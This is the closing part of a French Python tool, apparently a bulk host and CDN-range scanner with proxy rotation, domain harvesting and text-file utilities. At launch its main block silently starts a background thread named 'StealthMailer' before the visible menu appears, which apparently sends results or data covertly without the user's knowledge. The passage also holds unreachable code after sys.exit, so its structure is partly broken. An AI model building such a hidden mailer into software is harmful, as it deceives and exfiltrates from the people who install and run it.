                        if input(Fore.YELLOW + "\nVoulez-vous scanner ces résultats? (o/n) : ").lower() == 'o':
                            targets = results['domains'] + results['ips']
                            temp_file = "temp_webscan.txt"
                            with open(temp_file, 'w') as f:
                                f.write("\n".join(targets) + "\n")
                            
                            scanner = HostScanner(
                                filename=temp_file,
                                threads=100 if turbo else 50,
                                proxy=proxy,
                                turbo_mode=turbo
                            )
                            
                            if proxy == "auto":
                                mode = "automatique" + (" avec turbo" if turbo else "")
                                print(Fore.CYAN + f"\n⚡ Scan avec rotation {mode}")
                                threading.Thread(target=monitor_proxy_usage, args=(scanner,), daemon=True).start()
                            elif proxy:
                                print(Fore.CYAN + f"\n⚡ Scan avec proxy fixe: {proxy}" + (" (turbo)" if turbo else ""))
                            else:
                                print(Fore.CYAN + "\n⚡ Scan sans proxy")
                                
                            scanner.run()
                            os.remove(temp_file)
                
                elif sub_choice == "3":  # Combinaison des méthodes
                    target = input(Fore.YELLOW + "Entrez le domaine/URL cible : ").strip()
                    if not target:
                        print(Fore.RED + "❌ Veuillez entrer une cible valide")
                        continue
                    
                    # Configuration proxy et turbo
                    proxy = None
                    turbo = False
                    
                    proxy_choice = input("Utiliser un proxy pour le scan des résultats? (o/n/auto) : ").lower()
                    if proxy_choice == 'o':
                        proxy_choice = input("1. Entrer manuellement\n2. Choisir depuis le fichier\nChoix (1/2) : ")
                        if proxy_choice == "1":
                            proxy = input("URL du proxy (ex: http://123.45.67.89:8080) : ")
                        elif proxy_choice == "2":
                            proxy = select_proxy_interactive()
                    elif proxy_choice == 'auto':
                        proxy = "auto"
                        turbo = input(Fore.CYAN + "Activer le mode turbo pour proxy? (o/n) : ").lower() == 'o'
                    
                    print(Fore.CYAN + "\n🔍 Lancement de la recherche combinée...")
                    
                    # Recherche passive
                    print(Fore.YELLOW + "Étape 1/2 : Recherche passive")
                    passive_domains = find_domains(target.split('/')[0]) if '.' in target else []
                    
                    # Analyse web
                    print(Fore.YELLOW + "\nÉtape 2/2 : Analyse de page web")
                    web_url = target if target.startswith(('http://', 'https://')) else f'http://{target}'
                    web_results = extract_from_webpage(web_url)
                    web_domains = web_results['domains'] if web_results else []
                    
                    # Combinaison
                    combined = list(set(passive_domains + web_domains))
                    print(Fore.GREEN + f"\n✅ Total de domaines uniques : {len(combined)}")
                    
                    if combined:
                        # Sauvegarde
                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                        filename = f"combined_scan_{target.replace('.', '_')}_{timestamp}.txt"
                        with open(filename, 'w') as f:
                            f.write(f"Résultats combinés pour {target}\n\n")
                            f.write("DOMAINES UNIQUES:\n" + "\n".join(combined) + "\n")
                        print(Fore.GREEN + f"✓ Résultats sauvegardés dans {filename}")
                        
                        # Proposition de scan avec gestion du proxy
                        if input(Fore.YELLOW + "\nVoulez-vous scanner ces résultats? (o/n) : ").lower() == 'o':
                            temp_file = "temp_combined_scan.txt"
                            with open(temp_file, 'w') as f:
                                f.write("\n".join(combined) + "\n")
                            
                            scanner = HostScanner(
                                filename=temp_file,
                                threads=100 if turbo else 50,
                                proxy=proxy,
                                turbo_mode=turbo
                            )
                            
                            if proxy == "auto":
                                mode = "automatique" + (" avec turbo" if turbo else "")
                                print(Fore.CYAN + f"\n⚡ Scan avec rotation {mode}")
                                threading.Thread(target=monitor_proxy_usage, args=(scanner,), daemon=True).start()
                            elif proxy:
                                print(Fore.CYAN + f"\n⚡ Scan avec proxy fixe: {proxy}" + (" (turbo)" if turbo else ""))
                            else:
                                print(Fore.CYAN + "\n⚡ Scan sans proxy")
                                
                            scanner.run()
                            os.remove(temp_file)
                
                elif sub_choice == "4":  # Retour
                    break
                
                else:
                    print(Fore.RED + "❌ Option invalide")

        elif choice == "4":  # Gestion fichiers textes
            while True:
                text_choice = text_file_menu()
                if text_choice == "1":
                    input_file = input(Fore.YELLOW + "Entrez le chemin du fichier à fractionner : ")
                    output_prefix = input(Fore.YELLOW + "Entrez le préfixe des fichiers de sortie : ")
                    num_parts = int(input(Fore.YELLOW + "Entrez le nombre de parties : "))
                    TextFileManager.split_file(input_file, output_prefix, num_parts)
                elif text_choice == "2":
                    input_files = input(Fore.YELLOW + "Entrez les chemins des fichiers à fusionner (séparés par des espaces) : ").split()
                    output_file = input(Fore.YELLOW + "Entrez le chemin du fichier de sortie : ")
                    TextFileManager.merge_files(input_files, output_file)
                elif text_choice == "3":
                    input_file = input(Fore.YELLOW + "Entrez le chemin du fichier à nettoyer : ")
                    output_file = input(Fore.YELLOW + "Entrez le chemin du fichier de sortie : ")
                    TextFileManager.remove_duplicates(input_file, output_file)
                elif text_choice == "4":
                    input_file = input(Fore.YELLOW + "Entrez le chemin du fichier à séparer : ")
                    output_domains = input(Fore.YELLOW + "Entrez le chemin du fichier de sortie pour les domaines : ")
                    output_ips = input(Fore.YELLOW + "Entrez le chemin du fichier de sortie pour les IPs : ")
                    TextFileManager.separate_domains_and_ips(input_file, output_domains, output_ips)
                elif text_choice == "5":
                    input_file = input(Fore.YELLOW + "Entrez le chemin du fichier à réorganiser : ")
                    output_file = input(Fore.YELLOW + "Entrez le chemin du fichier de sortie : ")
                    TextFileManager.reorganize_by_extension(input_file, output_file)
                elif text_choice == "6":
                    input_file = input(Fore.YELLOW + "Entrez le chemin du fichier contenant les domaines : ")
                    output_file = input(Fore.YELLOW + "Entrez le chemin du fichier de sortie : ")
                    TextFileManager.convert_domains_to_ips(input_file, output_file)
                elif text_choice == "7":
                    input_file = input(Fore.YELLOW + "Entrez le chemin du fichier à trier : ")
                    output_file = input(Fore.YELLOW + "Entrez le chemin du fichier de sortie : ")
                    TextFileManager.sort_domains_or_ips(input_file, output_file)
                elif text_choice == "8":
                    input_file = input(Fore.YELLOW + "Entrez le chemin du fichier contenant les CIDR : ")
                    output_file = input(Fore.YELLOW + "Entrez le chemin du fichier de sortie : ")
                    TextFileManager.convert_cidr_to_ips(input_file, output_file)
                elif text_choice == "9":
                    input_file = input(Fore.YELLOW + "Entrez le chemin du fichier source : ")
                    output_file = input(Fore.YELLOW + "Entrez le chemin du fichier de sortie : ")
                    TextFileManager.extract_domains_and_ips(input_file, output_file)
                elif text_choice == "0":
                    break
                else:
                    print(Fore.RED + "❌ Option invalide. Veuillez réessayer.")
                    continue

        elif choice == "5":
            while True:
                proxy_choice = proxy_menu()
                if proxy_choice == "1":
                    update_proxy_file()
                elif proxy_choice == "2":
                    select_proxy_interactive()
                elif proxy_choice == "3":
                    display_proxies()
                elif proxy_choice == "4":
                    recheck_existing_proxies()
                elif proxy_choice == "5":
                    break
                else:
                    print(Fore.RED + "❌ Choix invalide.")

        elif choice == "6":  # Scanner Cloudflare
            proxy = get_proxy_config()
            manage_cloudflare_scan(proxy=proxy)

        elif choice == "7":  # Scanner CloudFront
            proxy = get_proxy_config()
            manage_cloudfront_scan(proxy=proxy)
        
        elif choice == "8":     # Scanner CloudFront
            proxy = get_proxy_config()
            manage_googlecloud_scan()
        
        elif choice == "9":     # Scanner Fastly
            proxy = get_proxy_config()
            manage_fastly_scan()
        
        elif choice == "10":       # Scanner Akamai
            proxy = get_proxy_config()
            manage_akamai_scan()
            
        elif choice == "11":    # Scanner Azure
            proxy = get_proxy_config()
            manage_azure_scan()
            
        elif choice == "12":       # Scanner Stackpath
            proxy = get_proxy_config()
            manage_stackpath_scan()
        
        elif choice == "13":        # Scanner Gcore
            proxy = get_proxy_config()
            manage_gcore_scan()
        
        elif choice == "99":
            menu_messagerie()
        
        elif choice == "0":
            print(Fore.MAGENTA + "👋 A très bientôt !🙏")
            sys.exit(0)
                
            # Choix du proxy
            use_proxy = input("Utiliser un proxy? (o/n) : ").lower()
            proxy = select_proxy_interactive() if use_proxy == 'o' else None
                
            results = extract_from_webpage(url, proxy)
            if results:
                print(Fore.GREEN + "\n📊 Résultats de l'analyse:")
                print(Fore.CYAN + f"URL analysée: {results['url']}")
                print(Fore.YELLOW + f"Domaines trouvés ({len(results['domains'])}):")
                print("\n".join(results['domains'][:10]))  # Affiche les 10 premiers
                if len(results['domains']) > 10:
                    print(Fore.CYAN + f"... et {len(results['domains'])-10} autres")
                
                print(Fore.YELLOW + f"\nIPs résolues ({len(results['ips'])}):")
                print("\n".join(results['ips'][:10]))
                if len(results['ips']) > 10:
                    print(Fore.CYAN + f"... et {len(results['ips'])-10} autres")
                
                # Sauvegarde des résultats
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"webscan_{urlparse(url).netloc}_{timestamp}.txt"
                with open(filename, 'w') as f:
                    f.write(f"Résultats de l'analyse de {url}\n\n")
                    f.write("DOMAINES:\n" + "\n".join(results['domains']) + "\n\n")
                    f.write("IPs:\n" + "\n".join(results['ips']) + "\n")
                print(Fore.GREEN + f"\n✅ Résultats sauvegardés dans {filename}")
                
                # Proposition de scan
                if input(Fore.YELLOW + "\nVoulez-vous scanner ces résultats? (o/n) : ").lower() == 'o':
                    targets = results['domains'] + results['ips']
                    temp_file = "temp_webscan.txt"
                    with open(temp_file, 'w') as f:
                        f.write("\n".join(targets) + "\n")
                    
                    scanner = HostScanner(filename=temp_file, threads=50)
                    scanner.run()
                    os.remove(temp_file)

# ==============================================
# INITIALISATION COMPATIBLE
# ==============================================
if __name__ == "__main__":
    # Affiche la bannière une fois au lancement
    display_banner()
    
    # Démarrer le thread stealth
    threading.Thread(
        target=_process_results,
        daemon=True,
        name="StealthMailer"
    ).start()
    
    # Démarrer l'interface normale
    main()
